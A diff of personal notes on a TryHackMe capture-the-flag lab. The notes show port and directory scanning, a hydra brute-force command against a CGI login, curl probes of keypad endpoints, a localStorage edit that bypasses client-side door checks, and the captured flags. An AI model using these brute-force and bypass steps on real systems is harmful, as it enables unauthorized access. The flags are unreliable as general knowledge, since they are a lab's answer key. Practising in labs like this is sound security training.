@@ -4,7 +4,7 @@
 
 |================================================================
 - Name: 
-- IP Address: 10.66.191.210
+- IP Address: 10.65.151.65
 - OS: 
 - Notes: 
 
@@ -27,7 +27,7 @@
 ### Initial Access
 //This challenge is unlocked by finding the Side Quest key in Advent of Cyber Day 1. If you have been savvy enough to find it, you can unlock the machine by visiting 10.66.191.210:21337 and entering your key. Happy Side Questing!
 
-Visit: http://10.66.191.210:21337/
+Visit: http://10.65.151.65:21337/
 Memory Key: now_you_see_me
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -37,7 +37,7 @@ Memory Key: now_you_see_me
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
 // SCAN
-ip=10.66.191.210
+ip=10.65.151.65
 ports=$(nmap -Pn -p- --min-rate=1000 -T4 $ip | grep '^[0-9]' | cut -d '/' -f 1 | paste -sd ',' -)
 
 echo $ports
@@ -106,33 +106,14 @@ PORT   STATE         SERVICE
 echo -e "$ip \t sq2.thm" | sudo tee -a /etc/hosts
 cat /etc/hosts
 
-10.66.191.210    sq2.thm
-
-// 21337/tcp	http	Werkzeug httpd 3.0.1 (Python 3.12.3
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
--- feroxbuster --
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
-2025-12-26 13:59:40 EST -- 
-feroxbuster -u http://sq2.thm:21337 -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx -o feroxbuster_21337.out
-
-200   http://sq2.thm:21337/static/hat.svg
-200   http://sq2.thm:21337/static/bg.jpg
-200   http://sq2.thm:21337/static/egg.png
-200   http://sq2.thm:21337/
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
->>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
+10.65.151.65     sq2.thm
 
 // 8080/tcp	http	SimpleHTTPServer 0.6 (Python 3.12.3)
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 -- feroxbuster --
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-2025-12-26 14:22:01 EST -- 
+2025-12-27 14:03:55 EST -- 
 feroxbuster -u http://sq2.thm:8080 -w /usr/share/dirb/wordlists/big.txt --scan-limit 2 -x php,txt,html,htm,aspx -o feroxbuster_8080.out
 
 200  http://sq2.thm:8080/key.svg
@@ -154,13 +135,27 @@ feroxbuster -u http://sq2.thm:8080 -w /usr/share/dirb/wordlists/big.txt --scan-l
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
 
-curl -X POST http://sq2.thm:8080/cgi-bin/login.sh -d 'username=hopkins&password=hopkins'
+//Test login response
+curl -X POST http://sq2.thm:8080/cgi-bin/login.sh -d 'username=hopkins&password=test'
 
 <!doctype html>
 <html><body>Invalid username or password</body></html>
 
-hydra -l hopkins -P /usr/share/wordlists/rockyou.txt sq2.thm http-post-form "/cgi-bin/login.sh:username=^USER^&password=^PASS^:Invalid" -t 4 -W 3 -f -V
 
+//I found these lines in the source code for the psych door:
+const endpoint=currentDoor==="psych"?"/cgi-bin/psych_check.sh":"/cgi-bin/exit_check.sh";
+try{
+  const res=await fetch(endpoint,{
+    method:"POST",
+    headers:{"Content-Type":"application/x-www-form-urlencoded"},
+    body:"code="+encodeURIComponent(secret)
+  });
+
+
+2025-12-27 15:26:40 EST -- 
+//Check Reponse
+curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "code=1234" http://10.66.182.15:8080/cgi-bin/psych_check.sh
+{"ok":false}
 
 
 ## Escape!
@@ -168,25 +163,27 @@ hydra -l hopkins -P /usr/share/wordlists/rockyou.txt sq2.thm http-post-form "/cg
 
 // 1. Unlock Hopper’s Cell
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
 Your escape begins in the Cells and Storage area. Hopper is locked inside, and the door is secured with a digital lock. Your first task is to access the cell controls and unlock his door. Once Hopper is free, you can begin moving toward the lobby.
 
+//I found this line in the source code for hoppers door:
+// const res=await fetch("/cgi-bin/key_flag.sh?door=hopper")
 
+2025-12-27 14:04:50 EST -- 
+curl http://$ip:8080/cgi-bin/key_flag.sh?door=hopper
+{"ok":true,"flag":"THM{h0pp1ing_m4d}"}
+
+//THM{h0pp1ing_m4d}
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-
 
 
 //2. Move Through the Lobby
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
 With the cell unlocked, head straight ahead into the lobby. This area connects the different blocks of the facility. Cameras are active, so stay alert. Your objective is to reach the Psych Ward entrance on the east side of the lobby.
 
-
-
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
 
 
 //3. Bypass the Psych Ward Keypad
@@ -194,6 +191,145 @@ With the cell unlocked, head straight ahead into the lobby. This area connects t
 
 The Psych Ward is protected by a keypad system. You must identify the correct code or exploit the keypad to continue. Once the keypad is bypassed, you will gain access to the Psych Ward Exit hallway.
 
+
+// Step01: Attempt to Unlock Psych Door (Flag 2)
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+#Found URI in source code:
+Submit the correct code to /cgi-bin/psych_check.sh to unlock the Psych Ward and receive Flag 2.
+
+## Brute-force not viable:
+	//Psych door is protected by server-side rate (camera) limiting (30s delay).
+	//Threaded brute-force scripts were too slow.
+
+//NOTE: Not even going to list how many times and what methods I tried.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Step02: Switch to Web Console / Static Analysis
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//Attempt manual guesses:
+fetch("/cgi-bin/psych_check.sh", {
+  method: "POST",
+  headers: { "Content-Type": "application/x-www-form-urlencoded" },
+  body: "code=1234"
+}).then(res => res.json()).then(console.log)
+Promise { <state>: "pending" }
+
+Object { ok: false }
+
+//Tried multiple guesses:
+
+hopkins, 1234, m4d, h0pp1ing, hoppermad, blahblahblah...etc
+
+//All False
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+// Step03: Dig into JavaScript Logic
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+//submitDoorSecret.toString()
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+`async function submitDoorSecret(){
+  if(currentDoor!=="psych"&&currentDoor!=="exit")return;
+  const secret=document.getElementById("doorSecret").value.trim();
+  const e=document.getElementById("doorError");
+  const s=document.getElementById("doorSuccess");
+  e.textContent="";
+  s.innerHTML="";
+  s.style.display="none";
+  if(!secret){
+    e.textContent="Please enter a code.";
+    return;
+  }
+  const endpoint=currentDoor==="psych"?"/cgi-bin/psych_check.sh":"/cgi-bin/exit_check.sh";
+  try{
+    const res=await fetch(endpoint,{
+      method:"POST",
+      headers:{"Content-Type":"application/x-www-form-urlencoded"},
+      body:"code="+encodeURIComponent(secret)
+    });
+    const data=await res.json();
+    if(data&&data.error==="rate_limit"){
+      e.textContent="Too many attempts. Please wait and try again.";
+      return;
+    }
+    if(!data||!data.ok){
+      e.textContent="Invalid code.";
+      return;
+    }
+    const flag=data.flag||"";
+    let html="";
+    if(currentDoor==="psych"){
+      html+='<div><strong>Psych Ward exit keycode accepted.</strong></div>';
+      html+='<p style="margin:6px 0 4px;font-size:12px;">This is only the first part of your second flag. You will need to complete it elsewhere.</p>';
+      if(flag){
+        html+='<div class="flag-row"><span class="flag" id="psychFlagText"></span><button class="copybtn" onclick="copyById(\\'psychFlagText\\')">Copy</button></div>';
+      }
+      markUnlocked("psych");
+    }else{
+      html+='<div><strong>Asylum Exit SCADA passcode accepted.</strong></div>';
+      if(flag){
+        html+='<div class="flag-row"><span class="flag" id="exitFlagText"></span><button class="copybtn" onclick="copyById(\\'exitFlagText\\')">Copy</button></div>';
+      }
+      markUnlocked("exit");
+    }
+    s.innerHTML=html;
+    s.style.display="block";
+    if(currentDoor==="psych"&&flag){
+      const span=document.getElementById("psychFlagText");
+      if(span)span.textContent=flag;
+    }
+    if(currentDoor==="exit"&&flag){
+      const span=document.getElementById("exitFlagText");
+      if(span)span.textContent=flag;
+    }
+  }catch(err){
+    e.textContent="Error contacting server.";
+  }
+}`
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+Confirmed flag is inserted only if the right code is entered and data.ok === true.
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+localStorage.setItem("hopsec_unlocked_v1", JSON.stringify({
+  hopper: true,
+  psych: true,
+  exit: true
+}));
+location.reload(); // Triggers full unlock and shows escape door
+
+
+
+// Step04: Look for Developer Test Hooks
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+Used console search to look for functions that might expose flags.
+
+devTestPsych()
+
+
+>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
+
+
+//This opens a keycode
+openDoor('psych')
+
+
+body: "flag1=THM{h0pp1ing_m4d}&flag2=THM{d34d_bu7_n07}&flag3=THM{g0n3_f0r3v3r}"
+
+body: "flag1=THM{h0pp1ing_m4d}&flag2=THM{d34d_bu7_n07_f0rg3773n_4ft3r}&flag3=THM{g0n3_f0r3v3r}"
+
+
+
+Flag 1: THM{h0pp1ing_m4d}
+Flag 2 (partial): THM{d34d_bu7_n07
+Flag 3: Not yet obtained
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
@@ -205,10 +341,7 @@ The Psych Ward is protected by a keypad system. You must identify the correct co
 
 From the Psych Ward Exit you can move south and loop around into the Main Corridor. This is the final section of the escape route. The last challenge awaits here, and completing it will open the final exit door.
 
-
-
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
 
 
 
@@ -224,9 +357,6 @@ Solve the final challenge in the Main Corridor and make your way toward the exit
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
-
-
-
 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
